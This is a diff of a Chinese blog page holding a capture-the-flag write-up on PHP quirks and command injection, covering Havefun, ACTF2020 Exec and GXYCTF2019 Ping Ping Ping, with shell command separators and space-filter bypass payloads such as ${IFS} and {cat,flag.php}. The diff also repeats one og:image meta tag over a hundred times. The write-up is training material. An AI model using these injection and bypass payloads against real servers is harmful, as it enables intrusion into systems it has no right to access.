@@ -20,20 +20,179 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# PHP特性+命令执行  #   #   # 第一次解题  URL:[http:&#x2F;&#x2F;114.116.119.253:8001&#x2F;cg.php](http:&#x2F;&#x2F;114.116.119.253:8001&#x2F;cg.php)  ![屏幕截图_20230112_203805.png](&#x2F;yuque-notes&#x2F;03-CTF Challenge&#39;s Writeup&#x2F;assets&#x2F;1c642882-屏幕截图_2">
+  <meta name="description" content="第一次解题 URL:http:&#x2F;&#x2F;114.116.119.253:8001&#x2F;cg.php ​ [极客大挑战 2019]Havefun1 涉及知识 - hackbar的相关使用知识 - 简单的php代码理解 解题过程 1.配置好hackbar插件 我用的火狐直接插件下载好 2.进入靶场 看到一只猫猫，…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP特性+命令执行">
 <meta property="og:url" content="http://example.com/2026/09/16/08-PHP%E7%89%B9%E6%80%A7+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# PHP特性+命令执行  #   #   # 第一次解题  URL:[http:&#x2F;&#x2F;114.116.119.253:8001&#x2F;cg.php](http:&#x2F;&#x2F;114.116.119.253:8001&#x2F;cg.php)  ![屏幕截图_20230112_203805.png](&#x2F;yuque-notes&#x2F;03-CTF Challenge&#39;s Writeup&#x2F;assets&#x2F;1c642882-屏幕截图_2">
+<meta property="og:description" content="第一次解题 URL:http:&#x2F;&#x2F;114.116.119.253:8001&#x2F;cg.php ​ [极客大挑战 2019]Havefun1 涉及知识 - hackbar的相关使用知识 - 简单的php代码理解 解题过程 1.配置好hackbar插件 我用的火狐直接插件下载好 2.进入靶场 看到一只猫猫，…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
 <meta property="article:published_time" content="2026-09-16T14:23:20.000Z">
 <meta property="article:modified_time" content="2026-09-16T14:23:20.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
-<meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="极客大挑战">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
 
 <link rel="canonical" href="http://example.com/2026/09/16/08-PHP%E7%89%B9%E6%80%A7+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
@@ -235,6 +394,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">第一次解题 URL:http://114.116.119.253:8001/cg.php ​ [极客大挑战 2019]Havefun1 涉及知识 - hackbar的相关使用知识 - 简单的php代码理解 解题过程 1.配置好hackbar插件 我用的火狐直接插件下载好 2.进入靶场 看到一只猫猫，…</div>
 
         </div>
       </header>
@@ -245,1316 +405,614 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# PHP特性+命令执行
-
-# 
-
-# 
-
-# 第一次解题
-
-URL:[http://114.116.119.253:8001/cg.php](http://114.116.119.253:8001/cg.php)
-
-![屏幕截图_20230112_203805.png](/yuque-notes/03-CTF Challenge's Writeup/assets/1c642882-屏幕截图_20230112_203805.png)
-
-​
-
-# [极客大挑战 2019]Havefun1
-
-## 涉及知识
-
-- hackbar的相关使用知识
-- 简单的php代码理解
-
-## 解题过程
-
-### 1.配置好hackbar插件
-
-我用的火狐直接插件下载好
-
-### 2.进入靶场
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/65ab7ccc-image.png)
-
-看到一只猫猫，然后f12看到如下内容
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/05418320-image.png)
-
-需要用get的方式提交一个cat变量使得cat=='dog'
-
-### 3.操作
-
-![1d58835bffb0a6e6.jpg](/yuque-notes/03-CTF Challenge's Writeup/assets/d8d4ff00-1d58835bffb0a6e6.jpg)
-
-1. 使用该功能将网页捕获
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/dfdf2383-image.png)
-
-1. get传参
-
-![-79374c0a7b1aef42.jpg](/yuque-notes/03-CTF Challenge's Writeup/assets/99a8ec1f--79374c0a7b1aef42.jpg)
-
-1. 将结果返回得到flge
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/11378c67-image.png)
-
-1. 提交 flag{ee9a84c1-cdb2-43f9-aaf4-d4f7758459c3} 得分
-
-# [ACTF2020 新生赛]Exec1
-
-## 涉及知识
-
-- 命令注入
-- ping命令
-- Linux基本操作指令
-- 命令联合执行
-
-## 解题过程
-
-### 进入题目
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e8458703-image.png)
-
-ping的相关知识点在总结​
-
-### 尝试ping该网页的域名
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/f6345b4c-image.png)
-
-获得该网站的IP地址（刚开始偷懒直接复制，没有意识那是网址而不是域名，所以卡得有点久）
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2377f7e8-image.png)
-
-*使用了“；”符号，前面的执行完执行后面的*​
-
-尝试常见的Linux指令，可以看到跟目录下有flag，尝试用cat指令让其输出
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/82d1e16b-image.png)
-
-得到flag{c4fcd196-1913-409a-89ec-3edb847200aa}
-
-## 知识点详解
-
-### ping命令
-
-**Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。**
-
-**应用格式：ping空格IP地址**
-
-1. 通常用来检测网络的连通情况和测试网络速度
-2. 根据域名得到相应主机的IP地址
-3. 根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量。
-4. 用来进行网络扫描和攻击
-
-附：
-
-bytes值：表示通信过程中发送的数据包大小，单位是字节。
-
-time值：表示响应时间，这个时间越小，说明你与对方通信的速度越快，延时越短。
-
-TTL值：Time To Live,表示数据包再经过多少个路由器如果还不能到达就将被丢弃，这里可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列。默认情况下，Linux系统的TTL最大值为64或255，WindowsNT/2000/XP系统的TTL最大值为128，UNIX主机的TTL最大值为255。
-
-原文链接：[https://blog.csdn.net/flyroc08/article/details/120103617](https://blog.csdn.net/flyroc08/article/details/120103617)
-
-​
-
-上课讲过，又去搜了一下细节
-
-### 网址的组成
-
-互联网类型(如最常见的www(万维网)等)+访问协议+域名的形式
-
-# [GXYCTF2019]Ping Ping Ping
-
-## 涉及知识
-
-### ping
-
-### linux联合执行
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">；  前面执行完执行后面</span><br><span class="line">|   通管符上一条命令的输出作为下一条命令的输入（显示后面的执行结果</span><br><span class="line">||  或，前面为假执行后面</span><br><span class="line">&amp;   将任务放在后台执行</span><br><span class="line">&amp;&amp;  且，一假全假，前面出错后面不执行</span><br><span class="line">%0a 换行</span><br><span class="line">%0d 回车</span><br></pre></td></tr></table></figure>
-
-### 空格绕过的一些小姿势
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符</span><br><span class="line">%09(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9($IFS$1)</span><br><span class="line">$IFS\</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line"></span><br><span class="line">注：在eval使用带有$的字符串时，需要进行用\转义，因为$在php中有特殊含义</span><br></pre></td></tr></table></figure>
-
-### 敏感字符绕过
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用变量拼接</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-### 正则表达式匹配规则，贪婪匹配
-
-[codeblock]
-
-### preg_match函数
-
-是进行正则表达式的匹配，成功返回1，否则返回0
-
-preg_match(正则表达式，需要匹配的对象，可选（即可以没有）匹配结果的数组）
-
-## 解题过程
-
-### 题目环境
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b84392c5-image.png)
-
-### 根据题目尝试ping一下通过burpsuite得到的IP
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/a69de4a4-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/c0008329-image.png)
-
-### 发现flag用cat获取
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/111e4ff6-image.png)
-
-### 绕过尝试
-
-#### 空格绕过
-
-1. 题目要求绕过空格键，绕过方法参考了唐师傅，在后面自己也根据网上查找的做了总结
-
-使用%09绕过
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/5f16118f-image.png)
-
-fack your symbol!可能过滤了特殊字符‘%’
-
-接下来尝试了分别尝试了
-
+        <h1 id="PHP特性-命令执行"><a href="#PHP特性-命令执行" class="headerlink" title="PHP特性+命令执行"></a>PHP特性+命令执行</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="第一次解题"><a href="#第一次解题" class="headerlink" title="第一次解题"></a>第一次解题</h1><p>URL:<a target="_blank" rel="noopener" href="http://114.116.119.253:8001/cg.php">http://114.116.119.253:8001/cg.php</a></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/1c642882-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_203805.png" alt="屏幕截图_20230112_203805.png"></p>
+<p>​</p>
+<h1 id="极客大挑战-2019-Havefun1"><a href="#极客大挑战-2019-Havefun1" class="headerlink" title="[极客大挑战 2019]Havefun1"></a>[极客大挑战 2019]Havefun1</h1><h2 id="涉及知识"><a href="#涉及知识" class="headerlink" title="涉及知识"></a>涉及知识</h2><ul>
+<li>hackbar的相关使用知识</li>
+<li>简单的php代码理解</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-配置好hackbar插件"><a href="#1-配置好hackbar插件" class="headerlink" title="1.配置好hackbar插件"></a>1.配置好hackbar插件</h3><p>我用的火狐直接插件下载好</p>
+<h3 id="2-进入靶场"><a href="#2-进入靶场" class="headerlink" title="2.进入靶场"></a>2.进入靶场</h3><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/65ab7ccc-image.png" alt="image.png"></p>
+<p>看到一只猫猫，然后f12看到如下内容</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/05418320-image.png" alt="image.png"></p>
+<p>需要用get的方式提交一个cat变量使得cat&#x3D;&#x3D;’dog’</p>
+<h3 id="3-操作"><a href="#3-操作" class="headerlink" title="3.操作"></a>3.操作</h3><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/d8d4ff00-1d58835bffb0a6e6.jpg" alt="1d58835bffb0a6e6.jpg"></p>
+<ol>
+<li>使用该功能将网页捕获</li>
+</ol>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/dfdf2383-image.png" alt="image.png"></p>
+<ol>
+<li>get传参</li>
+</ol>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/99a8ec1f--79374c0a7b1aef42.jpg" alt="-79374c0a7b1aef42.jpg"></p>
+<ol>
+<li>将结果返回得到flge</li>
+</ol>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/11378c67-image.png" alt="image.png"></p>
+<ol>
+<li>提交 flag{ee9a84c1-cdb2-43f9-aaf4-d4f7758459c3} 得分</li>
+</ol>
+<h1 id="ACTF2020-新生赛-Exec1"><a href="#ACTF2020-新生赛-Exec1" class="headerlink" title="[ACTF2020 新生赛]Exec1"></a>[ACTF2020 新生赛]Exec1</h1><h2 id="涉及知识-1"><a href="#涉及知识-1" class="headerlink" title="涉及知识"></a>涉及知识</h2><ul>
+<li>命令注入</li>
+<li>ping命令</li>
+<li>Linux基本操作指令</li>
+<li>命令联合执行</li>
+</ul>
+<h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="进入题目"><a href="#进入题目" class="headerlink" title="进入题目"></a>进入题目</h3><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e8458703-image.png" alt="image.png"></p>
+<p>ping的相关知识点在总结​</p>
+<h3 id="尝试ping该网页的域名"><a href="#尝试ping该网页的域名" class="headerlink" title="尝试ping该网页的域名"></a>尝试ping该网页的域名</h3><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/f6345b4c-image.png" alt="image.png"></p>
+<p>获得该网站的IP地址（刚开始偷懒直接复制，没有意识那是网址而不是域名，所以卡得有点久）</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2377f7e8-image.png" alt="image.png"></p>
+<p><em>使用了“；”符号，前面的执行完执行后面的</em>​</p>
+<p>尝试常见的Linux指令，可以看到跟目录下有flag，尝试用cat指令让其输出</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/82d1e16b-image.png" alt="image.png"></p>
+<p>得到flag{c4fcd196-1913-409a-89ec-3edb847200aa}</p>
+<h2 id="知识点详解"><a href="#知识点详解" class="headerlink" title="知识点详解"></a>知识点详解</h2><h3 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h3><p><strong>Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP&#x2F;IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。</strong></p>
+<p><strong>应用格式：ping空格IP地址</strong></p>
+<ol>
+<li>通常用来检测网络的连通情况和测试网络速度</li>
+<li>根据域名得到相应主机的IP地址</li>
+<li>根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量。</li>
+<li>用来进行网络扫描和攻击</li>
+</ol>
+<p>附：</p>
+<p>bytes值：表示通信过程中发送的数据包大小，单位是字节。</p>
+<p>time值：表示响应时间，这个时间越小，说明你与对方通信的速度越快，延时越短。</p>
+<p>TTL值：Time To Live,表示数据包再经过多少个路由器如果还不能到达就将被丢弃，这里可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX&#x2F;Linux系列。默认情况下，Linux系统的TTL最大值为64或255，WindowsNT&#x2F;2000&#x2F;XP系统的TTL最大值为128，UNIX主机的TTL最大值为255。</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/flyroc08/article/details/120103617">https://blog.csdn.net/flyroc08/article/details/120103617</a></p>
+<p>​</p>
+<p>上课讲过，又去搜了一下细节</p>
+<h3 id="网址的组成"><a href="#网址的组成" class="headerlink" title="网址的组成"></a>网址的组成</h3><p>互联网类型(如最常见的www(万维网)等)+访问协议+域名的形式</p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><h2 id="涉及知识-2"><a href="#涉及知识-2" class="headerlink" title="涉及知识"></a>涉及知识</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><h3 id="linux联合执行"><a href="#linux联合执行" class="headerlink" title="linux联合执行"></a>linux联合执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">；  前面执行完执行后面</span><br><span class="line">|   通管符上一条命令的输出作为下一条命令的输入（显示后面的执行结果</span><br><span class="line">||  或，前面为假执行后面</span><br><span class="line">&amp;   将任务放在后台执行</span><br><span class="line">&amp;&amp;  且，一假全假，前面出错后面不执行</span><br><span class="line">%0a 换行</span><br><span class="line">%0d 回车</span><br></pre></td></tr></table></figure>
+
